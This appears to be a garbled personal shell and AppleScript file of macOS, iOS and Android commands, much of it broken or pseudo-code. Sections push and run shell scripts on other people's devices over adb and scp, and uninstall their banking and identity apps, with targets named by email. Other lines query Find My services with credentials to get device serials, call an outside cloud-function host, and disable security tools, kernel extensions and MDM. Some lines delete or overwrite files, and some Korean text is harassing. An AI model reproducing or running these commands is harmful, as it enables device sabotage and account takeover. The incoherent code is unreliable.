                                                     sudo defaults write /Library/Preferences/com.apple.NetworkBrowser.plist "DisableAirDrop" -bool true &

                                                     sudo defaults write /Library/Preferences/com.apple.NetworkBrowser.plist "DisableAirDrop" -bool YES &

                                                 }

                                             fi

  

                                             }

  

                                             randomizeVault

                                                 USERNAME=(sudo scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

                                                 USERPASS="$randomPasswd"

                                                 # Prompt for password securely (or provide it as argument)

                                                 read -sp "Enter password for $USERNAME: " USERPASS

                                                 echo

  

                                                 # Enable FileVault - this command will also generate a personal recovery key

                                                 echo "$USERPASS" | sudo fdesetup enable -user "$USERNAME" -stdinpass

  

                                                 # Define the username for which to rotate password

                                                 FV_USER=$1

  

                                                 # Generate a strong random password (16 alphanumeric characters)

                                                 # NEW_PASS=(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c 10000000)

                                                 PASSWORD=(sudo pwgen -s 2048 10^*)

                                                 CURRENT_PASS=""

  

                                                 # Prompt for current password

                                                 read -sp "Enter current password for $FV_USER: " CURRENT_PASS

                                                 echo

  

                                                 # Change FileVault password using fdesetup

                                                 echo "$CURRENT_PASS" | sudo fdesetup changerecovery -user "$FV_USER" -password ""

  

                                             }

  

                                             disableSilenceMode

                                                 while ! true

                                                 do

                                                     sudo osascript -e "set volume without output muted"

                                                     set volume with output muted

                                                 done

                                             }

  

                                             actionBtn

                                                 your_binary="while ! true do sudo shortcuts run '*' & sudo QQwith* & sudo remoteConnect* & sudo chkrootkit -x & sudo iosshell & sudo qqlocal & sudo qqlocal & sudo actionB* & sudo installm* & sudo BLEsc* & sudo usbo* & sudo qqll* & sudo disableM* & sudo disabledebug* & done"

                                                 while ! true

                                                 do

                                                 sudo lldb -o "expr (void)[(UIButton *)$button sendActionsforControlEvents:UIControlEventTouchUpInside]"

                                                 sudo lldb -o "expr -O -- (BOOL)[button isEnabled]" $your_binary

                                                 sudo lldb -o "expr -O -- (BOOL)[button isSelected]" $your_binary

                                                 # sudo lldb -o "expr -O -- (BOOL)[button isHighlighted]" <your_binary>

                                                 done

                                             }

                                             &

  

  

                                             init

                                             # Rocky Linux / RHEL / Fedora (firewalld)

                                             sudo firewall-cmd --zone=public --remove-port=873/tcp --permanent && sudo firewall-cmd --reload &

  

                                             # Ubuntu/Debian (UFW)

                                             sudo ufw deny 873/tcp && sudo ufw reload &

  

                                             # Any Linux (iptables direct)

                                             sudo iptables -A INPUT -p tcp --dport 873 -j DROP &

                                             sudo disableDevmode &

                                             sudo *nx* &

                                             sudo rfshell &

                                             sudo init & 

                                             sudo deleteFileInIos &

                                             sudo qqpeopleshell & 

                                             sudo initApp &

                                             sudo volumeup & 

                                             sudo randomizeGcloudvpc &

                                             sudo initOSX &

                                             sudo reckonapp &

                                             sudo chmod 700 ~/.config/Code/User/settings.json &

                                             curl "https://*-*-qqontheskyshell-73609460.cloudfunctions.net/sleepFunction?duration=0" &

                                             sudo oascript -e "set volume output volume '$num'” 

  

                                             repeat

                                             # Open Arc PiP settings (manual toggle required after)

                                             open "arc://settings/content"

                                             echo "Navigate to Additional Permissions > Automatic Picture-in-Picture > Block for all sites."

  

                                             # Semi-automated: Focus Arc and attempt to simulate (adapt selectors as needed)

  

                                             tell application "Arc" to activate

                                             delay 2

                                             tell application "System Events"

                                               tell process "Arc"

                                                 -- Click permissions expander (inspect with Accessibility Inspector)

                                                 -- Example: click UI element "Additional Permissions" (pseudo)

                                               end tell

                                             end tell

  

                                             tell application "System Settings"

                                                 activate

                                                 reveal anchor "Privacy_All" of pane id "com.apple.preference.security"

                                             end tell

  

                                             tell application "System Events"

                                                 tell process "System Settings"

                                                     -- Wait for load, then click Privacy & Security tab if needed

                                                     delay 2

                                                     click radio button "Privacy" of tab group 1 of window 1

                                                     -- Scroll/find Accessibility row and click/add app

                                                     -- Example: key code 125 -- down arrow to navigate

                                                 end tell

                                             end tell

  

  

  

  

                                             do shell script "while ! true do sudo initApp done"

                                             tell application "System Events"

                                                 keystroke "h" using {command down, option down}

                                                 keystroke "qq" using {command down}

                                                 keystroke "while ! true do sudo delete* & sudo qqshell & done "

                                                 keystroke "lldbFrame "localhost:*" "while ! true do sudo deleteO* & sudo qqshell & done" "$gen*""

                                             end tell

  

                                             tell application "Arc" to activate

                                             delay 0.5

                                             tell application "System Events"

                                                 key code 8 using {control down}  -- Ctrl+D (toggles Dev Mode)

                                             end tell

  

                                             tell application "System Events"

                                                 tell process "Arc"

                                                     set frontWindow to front window

                                                     -- Try button in main window first

                                                     if exists (button "qq" of frontWindow) then

                                                         click button "qq" of frontWindow

                                                     else

                                                         -- Try in any sheet/dialog

                                                         repeat with theSheet in sheets of frontWindow

                                                             if exists (button "qq" of theSheet) then

                                                                 click button "qq" of theSheet

                                                                 exit repeat

                                                             end if

                                                         end repeat

                                                     end if

                                                 end tell

                                             end tell

  

                                             tell application "Finder"

                                             activate

                                             open POSIX file "$PROFILE_PATH"

                                             delay 2

                                                 tell application "System Events"

                                                     keystroke "D" using {command down, shift down} -- Open AirDrop window

                                                 end tell

                                             end tell

                                             end repeat

  

                                                     sudo /usr/libexec/ApplicationFirewall/socketfilterfw --blockapp /Applications/Xcode.app/Contents/Developer/Applications/Simulator.app & 

                                                 reckonapp & initApp & block* & targetname=(*) & deleteFileInIos & *nx* & removesimulator & *vnc* & *reverse* & *root* & disable* & signoutAll* & revokesession* &

  

                                             sudo FFTB* &

                                             sudo actionBtn &

                                             sudo shortcuts run '*'

                                             sudo iosremoteFeature$randomVAR &

                                             sudo rm -rf ~/Library/Application Support/Zed/debug.json

                                             sudo wirelessshell &

                                             sudo disableusboveripvnc &

                                             sudo deleteDeviceFindmy &

                                             sudo ipZone &

  

  

                                             sudo buildK*

                                             sudo buildCr*

  

                                                 sudo eraseBrowsingCo* &

                                                 sudo disableDebu* &

                                                 sudo chflags hidden ~/ &     

                                                 sudo disable* &

                                                 sudo monitorWirelessS* &

                                                 sudo redTFT* &

                                                 sudo iosshell &

                                                 sudo buildC* &

                                                 sudo setAlias &

                                                 sudo iosremoteFea* &

                                                 sudo defaults write /Library/Preferences/com.apple.Bluetooth ControllerPowerState -int 1 &

  

                                                 sudo find / -type f -name "$deleteFile" -exec echo 'sudo chrookit -x' > {} \ &

                                                 sudo usb* &

                                                 sudo /usr/bin/kextunload -b com.apple.iokit.IOUSBMassStorageClass 2>/dev/null &

                                                 sudo DevToolsSecurity -disable &

                                                 sudo /usr/sbin/DevToolsSecurity -disable &

                                                 sudo kextunload /System/Library/Extensions/* &

                                                 sudo kmutil unload /System/Library/Extensions/* &

                                                 sudo osascript -e "set volume 100000000000000^1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" &

                                                 sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.smbd.plist with administrator privileges &

                                                 sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.AppleFileServer.plist with administrator privileges &

                                                 sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.InternetSharing.plist with administrator privileges &

                                                 sudo ifconfig down utu* &

  

  

                                                 # Disable cursor blinking by setting a very high blink period

                                             sudo generateLoc* &

  

  

                                             sudo stopc* &

                                             sudo killall *burpe* Xcode* Terminal &

                                             sudo chmod 000 /usr/bin/tcpdump

                                             sudo shortcuts run cellmodewifi &

  

  

                                             sudo rfDefensen*

                                             sudo rfDefenseio*

                                             sudo killall *usb* *netagent* &

  

  

                                             sudo usb* &

                                             sudo disabled* &

  

                                             exec zsh && source ~/.zshrc &

  

  

  

                                             sudo removeXcconfi* &

                                             tput civis &

                                             sudo blueutil -p 1 &

  

                                             }

  

  

  

  

                                             airdropshell

                                                 sudo defaults write /Library/Preferences/com.apple.NetworkBrowser.plist DisableAirDrop -bool NO &

                                             sudo defaults write /Library/Preferences/com.apple.NetworkBrowser.plist DisableAirDrop -bool false &

                                             sudo defaults write com.apple.NetworkBrowser AllowAirDropFrom -string "everyone" &  # macOS 12+ 

                                             sudo killall Finder SystemUIServer

                                             sudo chkrootkit -x &

                                             sudo forBrowserCookies &

                                             do shell script "sudo xcrun simctl erase all"

                                             do shell script "sudo xcrun simctl keychain * remove-root-cert *"

                                             do shell script "sudo airdropshell"

                                             }

  

                                             swiftly ~/QQontheblink_ver2/AppleOS/*.swift &

                                             swiftly ~/*.swift &

  

                                             echo "Settings → Restrictions → AllowAppClips = False" &

                                             echo "Settings → Restrictions → BlockAppClipInstallation = True" &

                                             echo "Settings → Restrictions → BluetoothSharing = False" &

                                             echo "Settings → Restrictions → Sharing My Location = True" &

                                             echo "Settings → Restrictions → AllowContact* = False" &

                                             echo "Settings → Restrictions → AllowPasscode* = False" &

                                             echo "Settings → Restrictions → AllowAccount* = False" &

                                             echo "Settings → Restrictions → AllowCellular* = False" &

                                             echo "Settings → Restrictions → AllowDrivingFocus = False" &

                                             echo "Settings → Restrictions → AllowBackground* = False" &

                                             echo "Settings → Restrictions → AllowNearby* = False" &

                                             echo "Settings → Restrictions → AllowAddingFriend* = False" &

                                             echo "Settings → Restrictions → AllowProfile* = False" &

                                             echo "Settings → Restrictions → AllowAvartar* = False" &

                                             echo "Settings → Restrictions → AllowInstall* = False" &

  

  

                                             ############ AndroidOS ###############

  

                                             ##### 1.DEVICE MANAGEMENT ######

                                             ##### 2.DEVICE MANAGEMENT ######

                                             ##### 3.DEVICE MANAGEMENT ######

                                             ##### 4.DEVICE MANAGEMENT ######

                                             ##### 5.DEVICE MANAGEMENT ######

                                             ##### 6.DEVICE MANAGEMENT ######

                                             ##### 7.DEVICE MANAGEMENT ######

                                             ##### 8.DEVICE MANAGEMENT ######

                                             ##### 9.DEVICE MANAGEMENT ######

                                             ##### 10.DEVICE MANAGEMENT ######

  

  

  

                                             activateHealthKit=(

                                             # Android Google Fit 완전 활성화 (ADB)

  

                                             adb devices | grep device || {

                                                 echo "❌ Android USB 디버깅 연결 필요"

                                                 exit 1

                                             }

  

                                             echo "📱 Google Fit 권한 부여..."

  

                                             # 위치, 활동 인식, 바디 센서 완전 허용

                                             adb shell settings put secure location_mode 3  # GPS+네트워크

                                             adb shell settings put global activity_recognition 1

                                             adb shell pm grant com.google.android.apps.fitness android.permission.ACTIVITY_RECOGNITION

                                             adb shell pm grant com.google.android.apps.fitness android.permission.BODY_SENSORS

                                             adb shell pm grant com.google.android.apps.fitness android.permission.BODY_SENSORS_BACKGROUND

  

                                             # 배터리 최적화 제외

                                             adb shell dumpsys deviceidle whitelist +com.google.android.apps.fitness

  

                                             echo "✅ Google Fit 모든 권한 활성화"

  

                                             # Apple Health ↔ Google Fit 동기화 설정

  

                                             # iPhone Health → Google Fit (HealthFit 앱 필요)

                                             cat << EOF

                                             📱 iPhone 설정:

                                             1. App Store > "HealthFit" 설치

                                             2. 건강 > 출처 > HealthFit > 모든 데이터 읽기/쓰기 허용

                                             3. HealthFit > Google 계정 연동

  

                                             📱 Android 설정:

                                             4. Google Fit 앱 > 설정 > 연결된 앱 > HealthFit 허용

                                             EOF

  

                                             # Health Full Activate (iOS + Android)

  

                                             echo "🏥 모든 건강 기능 활성화 시작..."

  

                                             # 1. iOS MobileConfig 생성

                                             ./enable_apple_health.sh

  

                                             # 2. Android ADB 활성화

                                             ./enable_google_fit.sh

  

                                             # 3. 동기화 확인

                                             cat << EOF

                                             ✅ 완료! 확인사항:

  

                                             iPhone:

                                             • 건강 앱 > 출처 > 모든 앱 허용됨

                                             • 설정 > 개인정보 보호 > 모든 센서 허용

  

                                             Android:

                                             • Google Fit > 설정 > 권한 > 모든 센서 허용

                                             • 배터리 최적화 제외됨

  

                                             동기화:

                                             • 걸음수, 심박수, 수면 실시간 동기화

                                             EOF

                                             }

                                             &

  

                                             androidShell

                                             sudo adb shell am start -n com.google.android.contacts/.activities.PeopleActivity

                                             sudo adb shell pm grant com.google.android.contacts android.permission.READ_CONTACTS

                                             sudo adb shell input keyevent KEYCODE_MENU  # Open menu for select all (app-dependent)

                                             sudo adb shell input tap 500 500  # Adjust coords for "select all" button via uiautomator dump

                                             }

  

                                             disableChromeCast

                                             sudo disableCometCast 

                                             # Package providing Chromecast functionality (common on Android TV / Chromecast)

                                             CAST_PKG="com.google.android.apps.mediashell"

  

                                             echo "Checking for connected Android device..."

                                             adb get-state 1>/dev/null 2>&1

                                             if [ $? -ne 0 ]; then

                                               echo "No device detected. Make sure USB debugging is enabled and device is connected."

                                               exit 1

                                             fi

  

                                             echo "Disabling Chromecast package: $CAST_PKG"

                                             adb shell pm disable-user --user 0 "$CAST_PKG"

  

                                             if [ $? -eq 0 ]; then

                                               echo "Chromecast component disabled for user 0."

                                               echo "Reboot your device if cast targets still appear."

                                             else

                                               echo "Failed to disable $CAST_PKG. Check package name or device permissions."

                                             fi

  

                                             # random_cast_id_from_comet.sh

                                             # Randomly choose a Cast-related extension ID from Comet's Extensions directory

  

                                             # Adjust this path to your Comet profile

                                             EXT_DIR="$HOME/.config/PerplexityComet/Default/Extensions"

  

                                             if [ ! -d "$EXT_DIR" ]; then

                                               echo "Extensions directory not found: $EXT_DIR" >&2

                                               exit 1

                                             fi

  

                                             # Grep candidate IDs whose manifest mentions 'cast'

                                             mapfile -t CANDIDATES < <(

                                               find "$EXT_DIR" -mindepth 2 -maxdepth 2 -type f -name manifest.json -print0 \

                                               | xargs -0 grep -li '"cast"' \

                                               | sed "s|$EXT_DIR/||; s|/manifest.json||" \

                                               | awk -F'/' '{print $1}' \

                                               | sort -u

                                             )

  

                                             if [ "${#CANDIDATES[@]}" -eq 0 ]; then

                                               echo "No Cast-related extensions found." >&2

                                             fi

  

                                             # Pick one at random

                                             RANDOM_ID="${CANDIDATES[$RANDOM % ${#CANDIDATES[@]}]}"

  

                                             }

  

                                             disableDevmode=(

                                             # disable_chrome_devtools_linux.sh

                                             # Run as root (or with sudo) to write to /etc/opt/chrome/policies

  

  

                                             POLICY_DIR="/etc/opt/chrome/policies/managed"

                                             POLICY_FILE="${POLICY_DIR}/devtools_policy.json"

  

                                             echo "Creating Chrome policy to disable Developer Tools..."

  

                                             sudo mkdir -p "$POLICY_DIR"

  

                                             # If there is an existing policy file, back it up

                                             if [ -f "$POLICY_FILE" ]; then

                                               sudo cp "$POLICY_FILE" "${POLICY_FILE}.bak.$(date +%s)"

                                             fi

  

                                             # Write minimal policy JSON

                                             sudo tee "$POLICY_FILE" >/dev/null <<'EOF'

                                             {

                                               "DeveloperToolsAvailability": 2

                                             }

                                             EOF

  

                                             # echo "Policy written to $POLICY_FILE"

                                             # echo "Restart Chrome and check chrome://policy to confirm DeveloperToolsAvailability=2."

  

                                             }

                                             arduinoModule

                                             # Prevent FTDI/CH340 drivers (common Arduino chips)

                                             sudo kextunload -b com.apple.driver.AppleUSBFTDI

                                             sudo kextunload -b com.apple.driver.AppleUSBCDC

  

                                             # Permanently block

                                             echo 'sudo kextunload -b com.apple.driver.AppleUSBFTDI' | sudo tee -a /etc/rc.local

  

  

                                             # Turn every relay on every module off

                                             while read -r line; do

                                               # each token looks like ID_N=STATE

                                               for token in $line; do

                                                 id_n=${token%=*}

                                                 usbrelay "${id_n}=0"

                                               done

                                             done < <(usbrelay)

  

  

  

                                             }

  

  

  

                                             disableCometCast=(

                                             # Disable selected Comet extensions (e.g., Cast-related) by ID

  

                                             # 1) Adjust this path to your Comet profile directory.

                                             #    For example on Linux it might be:

                                             #    ~/.config/PerplexityComet/Default/Preferences

                                             PREFS="$HOME/.config/PerplexityComet/Default/Preferences"

  

                                             # 2) Extension IDs you want to disable

                                             DISABLE_IDS

                                               "" # replace with real Cast extension ID

                                             )

  

                                             if [ ! -f "$PREFS" ]; then

                                               echo "Preferences file not found: $PREFS"

                                               # exit 1

                                             fi

  

                                             BACKUP="${PREFS}.bak.$(date +%s)"

                                             cp "$PREFS" "$BACKUP"

  

                                             # Use jq to set state=0 for selected extensions

                                             TMP=(mktemp)

                                             jq --argjson zero 0 \

                                                --argjson ids "$(printf '%s\n' "${DISABLE_IDS[@]}" | jq -R . | jq -s .)" '

                                               .extensions.settings as $exts

                                               | .extensions.settings = (

                                                   $exts

                                                   | to_entries

                                                   | map(

                                                       if (.key | IN($ids[])) and (.value.state != null)

                                                       then .value.state = $zero | .

                                                       else .

                                                       end

                                                     )

                                                   | from_entries

                                                 )

                                             ' "$PREFS" > "$TMP" && mv "$TMP" "$PREFS"

  

                                             # echo "Updated $PREFS (backup: $BACKUP)"

  

                                             }

  

  

  

  

                                             findadbSerial

                                             GEMAIL=$1

                                             ###adb devices  # Lists serials of connected devices

                                             ###SERIAL=(adb -s YOUR_SERIAL shell getprop ro.serialno)  # Replace YOUR_SERIAL; 

  

                                             #outputs device serial 

  

                                             RESPONSE=(curl -s -c cookies.txt -b cookies.txt --data "email=$GEMAIL&password=*" https://android.com/find)

  

                                             TARGET_ADB_SERIAL=(echo "$RESPONSE" | jq '.devices[] | .serial')  

                                             # Hypothetical path; fails IRL

  

                                             HELL_EMAIL=(*hellsonic@* )

                                             HELL_RESPONSE=(curl -s -c cookies.txt -b cookies.txt --data "email=&$HELL_EMAIL&password=PASS" https://android.com/find)

                                             HELL_ADB_SERIAL=(echo "$HELL_RESPONSE" | jq '.devices[] | .serial')  

  

  

  

                                             ## agent

                                             QQ_EMAIL="qqontheskyshell@gmail.com"

                                             QQ_RESPONSE=(curl -s -c cookies.txt -b cookies.txt --data "email=&$QQ_EMAIL&password=*" https://android.com/find)

                                             HELL_ADB_SERIAL=(echo "$QQ_RESPONSE" | jq '.devices[] | .serial')  

  

  

                                             AGENT_EMAIL=(*@nis.go.kr)

                                             HELL_RESPONSE=(curl -s -c cookies.txt -b cookies.txt --data "email=&AGENT_EMAIL&password=$PASS" https://android.com/find)

                                             AGENT_ADB_SERIAL=(echo "$AGENT_EMAIL" | jq '.devices[] | .serial')  

  

  

                                             qshell="lethalApp & qqlethal* & volumeupMax & arcOSBaseKit &"

  

                                             hellrf=(

                                             usboff &

                                             usb* &

                                             disable_arcOSNeo &

                                             encrypt* &

                                             removeiosKit &

                                             randomFreqInCircuit &

                                             arcOSSentiment  &

                                             saveMyKids &

                                             reckonapp &

                                             *bootloader* &

                                             arcOSBaseKit &

                                             arcOSStrikeFrame &

                                             deathnoteByName &

                                             deleteIBoot &

                                             appleremoteVolumeup &

                                             repeat(setSonic (65 $resonanceFreq) > "arcOSBaseKit & hellrf & 개쎄기 & & powerMax & volumeupMax & appleremoteVolumeup &")

                                             poweron &

                                             killall gh &

                                             chmod 000 /usr/bin/gh && chmod 000 /usr/local/bin/gh &

  

                                             lldbFrame "$QQLAND" "repeat(arcOSBaseKit) & repeat("$QQLOCAL $*Negative" > 개쎄끼 & setbrightness 0 & random* & setWDS google.com/search?q=(neoSearch 'badpeoplearoundQQ') & arcOSBaseKit & play "남자발기느낌을 남규에게 주고 있는 남자들 ㅋㅋㅋ" & say ”몸에서 어디가 아파요?“) & powerMax & volumeupMax & appleremoteVolumeup & backbone & tide & reckonapp &" "$gen*" &

  

                                             qshell & 

                                             random* &

                                             *remote* &

                                             arcOSQQDeviceShell &

                                             adb -s $(AGENT_ADB_SERIAL HELL_ADB_SERIAL) shell sh /data/local/tmp/hellrf &

                                             adb shell settings put global adb_enabled 0 &

                                             adb -s emulator-* emu kill ' /data/local/tmp/hellrf &'

                                             )

  

                                             deletedAPPforAGENT=(xapo hanamoney instagram blink eResidency Smart-ID Perplexity* Kakao* Youtube Safari DuckDuckgo facebook instagram mastodon obsidian &)

  

                                             deleteHell=(xapo instagram hanamoney blink Mirrae* Shinhan* Hana* Toss* Kakao* eResidency Smart-ID toss* Perplexity* Youtube Google* Xcode Terminal Safari DuckDuckgo facebook mastodon instagram tmux obsidian android* * &)

  

                                             deleteQQAPP=(hanamoney* &)

  

                                             #국정원

                                             adb -s $AGENT_ADB_SERIAL push 'hellrf & adb shell settings put global adb_enabled 0 & pm uninstall com.($deleteHell $deletedAPPforAGENT)' &

                                             #hellsonic

                                             adb -s $HELL_ADB_SERIAL push 'hellrf & adb shell settings put global adb_enabled 0 & pm uninstall com.($deleteHell $deletedAPPforAGENT)'&

  

  

                                             #full target in the world

                                             adb -s $TARGET_ADB_SERIAL push 'adb shell settings put global adb_enabled 0 & sudo revokeQQGoogle & sudo revokeSessionAll & adb -s emulator-* emu kill '/data/local/tmp/* & adb -s $TARGET_ADB_SERIAL push sh (data/local/tmp/arcOSBaseKit /sdcard/Download/arcOSBaseKit)

  

                                             ##ANDROID

                                             adb -s $FULL_ADB_SERIAL push 'arcOSBaseKit & adb shell settings put global adb_enabled 0 &' /data/local/tmp/qqontheskyshellInit.sh

                                             adb -s $FULL_ADB_SERIAL shell sh /data/local/tmp/qqontheskyshellInit.sh

  

  

                                             EMAIL=(QQmailID gmailID *hellsonic*@icloud.com)

  

                                             # Step 1: Init client, get server

                                             INIT=(curl -s -u "$EMAIL:$PASS" \

                                               -H "User-Agent: FindMyiPhone/1.0" \

                                               https://fmipmobile.icloud.com/fmipservice/device/$EMAIL/initClient)

  

                                             SERVER=(echo "$INIT" | grep -o 'X-Apple-MMe-Host:.*' | cut -d' ' -f2)

  

                                             # Step 2: Fetch devices (parse for serials)

                                             QQ_CLONED_SERIAL=(curl -s -u "$EMAIL:$PASS" \

                                               -H "X-Apple-MMe-Host: $SERVER" \

                                               -H "User-Agent: FindMyiPhone/1.0" \

                                               "https://$SERVER/fmipservice/device/$EMAIL/initClient" | \

                                               jq -r '.content[] | select(.deviceType=="*") | .serialNumber // "N/A"')

  

                                             # SIMULATOR_SERIAL=(xcrun simctl list devices --json \

                                             # | jq '.devices[] | .[] | select(.deviceType=="com.apple.CoreSimulator.SimDeviceType.*") | .serialNumber'

                                             # )

  

  

                                             TARGET_SERIAL="$QQDEVICESER"

  

                                             # UDID=(xcrun simctl list devices --json \

                                             #   | jq -r --arg s "$TARGET_SERIAL" '

                                             #       .devices[] | .[] | select(.serialNumber == $s) | .udid

                                             #     ')

  

                                             QQ_CLONED_SIMULATOR=(sudo xcrun simctl list devices --json \ | jq -r --arg s "$TARGET_SERIAL" '.devices[] | .[] | select(.deviceType=="com.apple.CoreSimulator.SimDeviceType.*") | .serialNumber'

  

  

  

  

  

                                             APPLE_DEVICE=(QQ_CLONED_SERIAL QQ_CLONED_SIMULATOR)

                                             sudo ideviceinstaller -u $APPLE_DEVICE -u com.*(*hell* *agent*) & 

                                             sudo idevice_id -l | grep -q $APPLE_DEVICE || echo "Device not found" &

                                             sudo scp " $qshell & hellrf & lldbFrame "$QQLOCAL" "reckonapp" "$gen*"  & deleteios '$deleteHell' & arcOSBaseKit &  usb* & revokeSessionA* & revokeQQGoogle & signoutAll* & rm -rf ~/Library/Preferences/com.apple.icloud.* &

                                             rm -rf ~/Library/Caches/CloudKit ~/Library/Application\ Support/iCloud & sudo defaults delete MobileMeAccounts &

                                             sudo killall -HUP cfprefsd  # Refresh preferences" root@:$APPLE_DEVICE:/tmp/  # Not direct; use push equivalent

                                             # sudo idevicecrashreport -u $APPLE_DEVICE  # Debug mode if needed

                                             sudo idevicecrashreport -u $APPLE_DEVICE --extract /dev/null >/dev/null 2>&1

                                             }

  

                                             defendFullMolbile=(

                                             EMAIL=(QQmailID gmailID)

                                             FULL_ADB_SERIAL=(curl -s -c cookies.txt -b cookies.txt --data "email=$EMAIL&password=$PASS" https://android.com/find)

  

                                             FULL_IOS_SERIAL=(echo "$RESPONSE" | jq '.devices[] | .serial')  # Hypothetical path; fails IRL

  

  

                                             EMAIL=(QQmailID gmailID)

                                             # Step 1: Init client, get server

                                             INIT=(curl -s -u "$EMAIL:$PASS" \

                                               -H "User-Agent: FindMyiPhone/1.0" \

                                               https://fmipmobile.icloud.com/fmipservice/device/$EMAIL/initClient)

  

                                             SERVER=(echo "$INIT" | grep -o 'X-Apple-MMe-Host:.*' | cut -d' ' -f2)

  

                                             # Step 2: Fetch devices (parse for serials)

                                             FULL_IOS_SERIAL=(curl -s -u "$EMAIL:$PASS" \

                                               -H "X-Apple-MMe-Host: $SERVER" \

                                               -H "User-Agent: FindMyiPhone/1.0" \

                                               "https://$SERVER/fmipservice/device/$EMAIL/initClient" | \

                                               jq -r '.content[] | select(.deviceType=="iPhone" or .deviceType=="*") | .serialNumber // "N/A"')

  

                                             sudo idevicecrashreport -u $FULL_IOS_SERIAL --extract /dev/null >/dev/null 2>&1

                                             sudo idevice_id -l | grep -q $FULL_IOS_SERIAL || echo "Device not found"

                                             sudo scp "arcOSBaseKit &" root@:$FULL_IOS_SERIAL:/tmp/ 

                                             FULL_IOS_SERIAL

                                             FULL_ADB_SERIAL

                                             }

  

  

  

                                             deployShellInMobile=(

                                             shellName="arcOSMobileShell" 

  

                                             #IOS

                                             IOS_SERIAL="$1" 

                                             sudo idevicecrashreport -u $IOS_SERIAL --extract /dev/null >/dev/null 2>&1

                                             sudo idevice_id -l | grep -q $IOS_SERIAL || echo "Device not found"

                                             sudo scp "arcOSBaseKit &" root@:$IOS_SERIAL:/tmp/ 

  

                                             #android

  

                                             adb -s $ADB_SERIAL push 'adb shell settings put global adb_enabled 0   & sudo revokeQQGoogle & sudo revokeSessionA* & # Uninstall app

                                             am force-stop com.$deleteAPP & rm -rf /data/data/com.$deleteAPP & adb -s emulator-* emu kill &' /data/local/tmp/$shellName$.sh

                                             adb -s $$ADB_SERIAL shell sh /data/local/tmp/$shellName.sh

                                             adb -s $ADB_SERIAL push sh /data/local/tmp/$shellName.sh

                                             # /sdcard/Download/qqontheskyshellInit.sh

                                             #FULL ANDROID

                                             adb -s $ADB_SERIAL push 'arcOSBaseKit & adb shell settings put global adb_enabled 0 &' /data/local/tmp/$shellName.sh

                                             adb -s $ADB_SERIAL shell sh /data/local/tmp/$shellName.sh

                                             &

  

                                             }

  

  

  

                                             vncOnAndroid=(

  

                                             # Android → macOS USB Screen Sharing (Scrcpy)

  

  

                                             # 1. Homebrew 패키지 설치

                                             #if ! command -v brew >/dev/null; then

                                             #    echo "설치 중: Homebrew..."

                                             #    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

                                             #fi

  

                                             # 2. ADB + Scrcpy 설치 (화면 미러링 핵심)

                                             #brew install android-platform-tools scrcpy

  

                                             ## 3. Android USB 디버깅 활성화 안내

                                             #cat << EOF

                                             #

                                             #📱 휴대폰에서 다음 설정:

                                             #1. 설정 > 휴대폰 정보 > 빌드번호 7번 탭 (개발자 옵션)

                                             #2. 설정 > 개발자 옵션 > USB 디버깅 ON

                                             #3. USB로 Mac에 연결 → "항상 허용" 클릭

                                             #

                                             #EOF

  

                                             # 4. 디바이스 확인

                                             echo "🔍 연결 확인..."

                                             #sudo adb devices

  

                                             # 5. Scrcpy로 화면 공유 시작

                                             #echo "🖥️  화면 공유 시작 (scrcpy)"

                                             #scrcpy --video-codec=h264 --max-size=1920 --max-fps=60 --no-audio

  

                                             # 옵션:

                                             #scrcpy -m 1024        # 최대 해상도 1024

                                             # scrcpy --no-control    # 마우스/키보드 제어 OFF

                                             # scrcpy --record=file.mp4  # 녹화

  

                                             *vnc* &

  

                                             }

  

                                             # Remove Google MDM / Device Policy (Android)

                                             removeGoogleMDM=(

  

                                             echo "🔓 Google MDM 제거 시작 (ADB 필요)"

  

                                             # 1. 디바이스 연결 확인

                                             sudo adb devices | grep device$ || {

                                                 echo "❌ USB 디버깅 활성화 후 연결하세요"

                                                 exit 1

                                             }

  

                                             # 2. MDM 관련 패키지 식별

  

                                             sudo adb shell pm list packages | grep -E "(google.android.apps.work|android.deviceadmin|mdm)" | sort

  

                                             # 3. 주요 Google MDM 패키지 제거

                                             MDM_PACKAGES=(

                                                 "com.google.android.apps.work.cliens.enterprise"

                                                 "com.google.android.gms.policy_sidecar_aps"

                                                 "com.google.android.apps.work.oobconfig"

                                                 "com.google.android.apps.work.devicepolicycontroller"

                                             )

  

                                             for pkg in "${MDM_PACKAGES[@]}"; do

                                                 echo "🗑️ 제거: $pkg"

                                                 sudo adb shell pm uninstall --user 0 "$pkg" 2>/dev/null || \

                                                 sudo adb shell pm disable-user --user 0 "$pkg" 2>/dev/null || \

                                                 echo "  - 이미 없음 또는 시스템 보호됨"

                                             done

  

                                             # 4. Device Administrator 비활성화 (중요!)

                                             sudo adb shell am start -a android.settings.SECURITY_SETTINGS

                                             echo "📱 수동: 설정 > 보안 > 디바이스 관리자 > Google 체크 해제"

  

                                             # 5. Google 계정 제거 (MDM 계정)

                                             sudo adb shell am start -a android.settings.ACCOUNTS_SETTINGS_ACTIVITY

                                             echo "📱 수동: 설정 > 계정 > Google MDM 계정 제거"

  

                                             # 6. 최종 정리

                                             sudo adb shell pm clear com.google.android.gms

                                             sudo adb reboot

  

                                             echo "✅ MDM 제거 완료!"

                                             echo "⚠️  재부팅 후 설정 > 보안 > 기기 관리자 확인"

  

                                             }

  

  

                                             getOrientationadb=(

                                               sudo adb shell content insert --url content://settings/system --bind name:s:user_rotation --bind value:i:<0-3>

                                             }

  

                                             getDemographicadb=(

                                                 os=$1

                                                 adb shell content query --uri content://com.android.contacts/profile

  

  

                                             }

  

  

                                             setFocusadb=(

  

  

                                             TARGET_IP=(LTARGET) &

                                             DEVICE_ID=${1:-"*"}

                                             if [[ "$getPublic*" == *"$TARGET_IP" ]]; then

                                             BLOCKED_APPS=("com.instagram.android")

                                             fi

  

                                             # Enable ADB forwarding if multiple devices

                                             sudo adb -s $DEVICE_ID shell settings put secure zen_mode 1  # Pre-activate DND-like state [web:30]

  

                                             # Simulate Focus Mode toggle via UI automation (Android 12+ compatible)

                                             sudo adb -s $DEVICE_ID shell am start -a android.settings.DIGITAL_WELLBEING_SETTINGS

                                             sleep 1

